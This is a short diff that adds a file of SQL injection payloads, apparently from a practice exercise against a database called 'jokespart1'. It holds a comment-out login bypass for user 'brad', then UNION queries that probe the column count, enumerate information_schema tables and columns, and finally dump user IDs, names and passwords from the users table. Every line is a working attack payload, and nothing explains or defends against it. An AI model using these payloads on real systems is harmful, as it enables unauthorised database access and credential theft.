@@ -1,0 +1,11 @@
+brad ';-- 
+
+' UNION (SELECT 1,2,3);-- 
+
+' UNION (SELECT 1, TABLE_SCHEMA, TABLE_NAME FROM information_schema.tables) ;-- 
+
+' UNION (SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.columns where table_schema = 'jokespart1' and table_name = 'users') ; -- 
+
+' UNION (SELECT user_id, user_name, password FROM jokespart1.users ) ;-- 
+
+
